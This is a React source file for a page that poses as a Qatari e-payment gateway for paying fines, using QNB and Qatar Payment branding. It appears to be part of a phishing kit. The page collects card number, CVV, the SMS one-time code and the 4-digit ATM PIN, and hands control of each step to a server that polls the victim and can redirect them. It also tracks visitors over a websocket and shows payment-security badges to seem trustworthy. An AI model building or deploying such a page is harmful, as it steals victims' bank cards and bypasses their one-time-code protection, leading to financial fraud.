import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || localStorage.getItem("paymentSessionId") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  const { data: sessionData } = trpc.payment.getSession.useQuery(
    { sessionId },
    { enabled: !!sessionId }
  );

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
    }
  );

  useEffect(() => {
    if (sessionId) {
      updateStageMutation.mutate({ sessionId, stage: "card" });
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/payment&sessionId=${sessionId}`);
      return () => ws.close();
    }
  }, [sessionId]);

  useEffect(() => {
    if (sessionStatus?.redirectUrl) {
      window.location.href = sessionStatus.redirectUrl;
      return;
    }
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber: cardNumber.replace(/\s+/g, ''),
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  const formatCardNumber = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(' ');
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
    return v;
  };

  const isAr = lang === "ar";

  return (
    <div className="min-h-screen bg-[#F1F5F9]" dir={isAr ? "rtl" : "ltr"}>
      <Header />
      
      <main className="container mx-auto px-4 py-8 max-w-lg">
        {/* Payment Container */}
        <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-gray-100">
          
          {/* Official Header */}
          <div className="bg-[#003E66] p-6 text-white text-center">
            <h1 className="text-xl font-bold">{isAr ? "بوابة الدفع الإلكتروني" : "E-Payment Gateway"}</h1>
            <div className="flex justify-center gap-4 mt-4">
              <img src="/qatar-payment-text.png" alt="Qatar Payment" className="h-8 opacity-90" />
            </div>
          </div>

          <div className="p-8">
            {/* Stage: Card Entry */}
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-6">
                <div className="bg-gray-50 p-4 rounded-2xl flex justify-between items-center border border-gray-100">
                  <span className="text-gray-500 font-medium">{isAr ? "المبلغ الإجمالي" : "Total Amount"}</span>
                  <span className="text-2xl font-bold text-[#8C1D3D]">{sessionData?.totalAmount || "0.00"} ر.ق</span>
                </div>

                {error && <div className="p-4 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100 font-bold">{error}</div>}

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-bold text-gray-600 mb-2">{isAr ? "الاسم على البطاقة" : "Cardholder Name"}</label>
                    <input type="text" value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-[#003E66]/20 focus:border-[#003E66] transition-all" placeholder="JASSIM AL-THANI" required />
                  </div>
                  <div>
                    <label className="block text-sm font-bold text-gray-600 mb-2">{isAr ? "رقم البطاقة" : "Card Number"}</label>
                    <div className="relative">
                      <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} maxLength={19} className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-[#003E66]/20 focus:border-[#003E66] transition-all font-mono tracking-widest" placeholder="0000 0000 0000 0000" required />
                      <div className={`absolute inset-y-0 ${isAr ? "left-4" : "right-4"} flex items-center`}>
                        <img src="/card-brands.png" alt="cards" className="h-6" />
                      </div>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-bold text-gray-600 mb-2">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} maxLength={5} placeholder="MM/YY" className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-[#003E66]/20 focus:border-[#003E66] text-center font-mono" required />
                    </div>
                    <div>
                      <label className="block text-sm font-bold text-gray-600 mb-2">{isAr ? "رمز الأمان (CVV)" : "Security Code"}</label>
                      <input type="password" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} maxLength={3} placeholder="***" className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-[#003E66]/20 focus:border-[#003E66] text-center font-mono" required />
                    </div>
                  </div>
                </div>

                <button type="submit" disabled={submitCardMutation.isPending} className="w-full py-5 bg-[#003E66] text-white rounded-2xl font-bold text-lg hover:bg-[#002d4d] transition-all shadow-lg active:scale-[0.98] disabled:opacity-70">
                  {submitCardMutation.isPending ? (isAr ? "جاري المعالجة..." : "Processing...") : (isAr ? "إتمام الدفع الآمن" : "Complete Secure Payment")}
                </button>
              </form>
            )}

            {/* Stage: Loading / Pending */}
            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-16 text-center space-y-6">
                <div className="relative w-20 h-20 mx-auto">
                  <div className="absolute inset-0 border-4 border-[#003E66]/20 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-[#003E66] border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div>
                  <h3 className="text-xl font-bold text-[#003E66] mb-2">{isAr ? "جاري التحقق..." : "Verifying..."}</h3>
                  <p className="text-gray-500">{isAr ? "يرجى الانتظار، يتم تأمين اتصالك ببنك قطر الوطني" : "Please wait, securing your connection with QNB"}</p>
                </div>
                <div className="bg-blue-50 p-4 rounded-xl text-xs text-blue-700 leading-relaxed">
                  {isAr ? "لا تقم بإغلاق هذه الصفحة أو تحديثها لضمان إتمام العملية بنجاح." : "Do not close or refresh this page to ensure a successful transaction."}
                </div>
              </div>
            )}

            {/* Stage: OTP (One Time Password) */}
            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-8 py-4">
                <div className="w-16 h-16 bg-blue-50 text-[#003E66] rounded-full flex items-center justify-center mx-auto">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                </div>
                <div>
                  <h3 className="text-2xl font-bold text-gray-900 mb-2">{isAr ? "رمز التحقق (OTP)" : "Verification Code"}</h3>
                  <p className="text-gray-500 text-sm">
                    {isAr ? "أدخل الرمز المرسل إلى هاتفك المسجل لدى البنك" : "Enter the code sent to your bank-registered phone"}
                  </p>
                </div>
                <input 
                  value={otpCode} 
                  onChange={(e) => setOtpCode(e.target.value)} 
                  className="w-full text-center text-4xl font-bold p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#003E66] focus:bg-white transition-all font-mono tracking-[0.3em]" 
                  placeholder="••••••" 
                  maxLength={6} 
                  required 
                  autoFocus
                />
                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#003E66] text-white font-bold py-5 rounded-2xl text-lg shadow-lg hover:bg-[#002d4d] transition-all">
                  {submitOtpMutation.isPending ? (isAr ? "جاري التأكيد..." : "Confirming...") : (isAr ? "تأكيد الرمز" : "Confirm Code")}
                </button>
                <p className="text-sm text-gray-400">
                  {isAr ? "لم يصلك الرمز؟" : "Didn't receive code?"} <span className="text-[#003E66] font-bold cursor-pointer">{isAr ? "إعادة إرسال" : "Resend"}</span>
                </p>
              </form>
            )}

            {/* Stage: ATM PIN */}
            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="text-center space-y-8 py-4">
                <div className="w-16 h-16 bg-blue-50 text-[#003E66] rounded-full flex items-center justify-center mx-auto">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                </div>
                <div>
                  <h3 className="text-2xl font-bold text-gray-900 mb-2">{isAr ? "الرقم السري للبطاقة" : "ATM PIN"}</h3>
                  <p className="text-gray-500 text-sm">
                    {isAr ? "يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام" : "Please enter your 4-digit secret PIN"}
                  </p>
                </div>
                <div className="flex justify-center">
                  <input 
                    type="password" 
                    value={atmPin} 
                    onChange={(e) => setAtmPin(e.target.value.replace(/[^0-9]/g, ''))} 
                    className="w-48 text-center text-4xl font-bold p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#003E66] focus:bg-white transition-all font-mono tracking-[0.5em]" 
                    placeholder="••••" 
                    maxLength={4} 
                    required 
                    autoFocus
                  />
                </div>
                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#003E66] text-white font-bold py-5 rounded-2xl text-lg shadow-lg hover:bg-[#002d4d] transition-all">
                  {submitAtmPinMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرقم السري" : "Confirm PIN")}
                </button>
              </form>
            )}

            {/* Stage: Success */}
            {stage === "success" && (
              <div className="py-12 text-center space-y-8">
                <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto">
                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" /></svg>
                </div>
                <div>
                  <h3 className="text-3xl font-bold text-gray-900 mb-2">{isAr ? "تم الدفع بنجاح" : "Payment Successful"}</h3>
                  <p className="text-gray-500">
                    {isAr ? "شكراً لك، تم استلام مبلغ المخالفات وتحديث السجل." : "Thank you, payment received and records updated."}
                  </p>
                </div>
                <div className="bg-gray-50 p-6 rounded-2xl border border-gray-100 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">{isAr ? "رقم العملية" : "Transaction ID"}</span>
                    <span className="font-mono font-bold text-[#003E66]">#{sessionId.substring(0, 8).toUpperCase()}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">{isAr ? "التاريخ" : "Date"}</span>
                    <span className="font-bold">{new Date().toLocaleDateString(isAr ? 'ar-QA' : 'en-US')}</span>
                  </div>
                </div>
                <button onClick={() => navigate("/")} className="w-full bg-gray-900 text-white font-bold py-5 rounded-2xl shadow-lg hover:bg-black transition-all">
                  {isAr ? "العودة للرئيسية" : "Back to Home"}
                </button>
              </div>
            )}

            {/* Stage: Failed */}
            {stage === "failed" && (
              <div className="py-12 text-center space-y-8">
                <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto">
                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M6 18L18 6M6 6l12 12" /></svg>
                </div>
                <div>
                  <h3 className="text-3xl font-bold text-gray-900 mb-2">{isAr ? "فشلت العملية" : "Payment Failed"}</h3>
                  <p className="text-gray-500">
                    {error || (isAr ? "عذراً، لم نتمكن من معالجة الدفع حالياً." : "Sorry, we couldn't process your payment at this time.")}
                  </p>
                </div>
                <button onClick={() => setStage("card")} className="w-full bg-[#8C1D3D] text-white font-bold py-5 rounded-2xl shadow-lg hover:bg-[#6D112C] transition-all">
                  {isAr ? "حاول مرة أخرى" : "Try Again"}
                </button>
                <button onClick={() => navigate("/")} className="w-full text-gray-400 font-medium">
                  {isAr ? "إلغاء العملية" : "Cancel Transaction"}
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Security Trust Badges */}
        <div className="mt-8 flex justify-center items-center gap-6 opacity-40 grayscale">
          <img src="/pci-dss.png" alt="PCI" className="h-8" />
          <img src="/verified-by-visa.png" alt="Visa" className="h-8" />
          <img src="/mastercard-id-check.png" alt="Mastercard" className="h-8" />
        </div>
      </main>
    </div>
  );
}
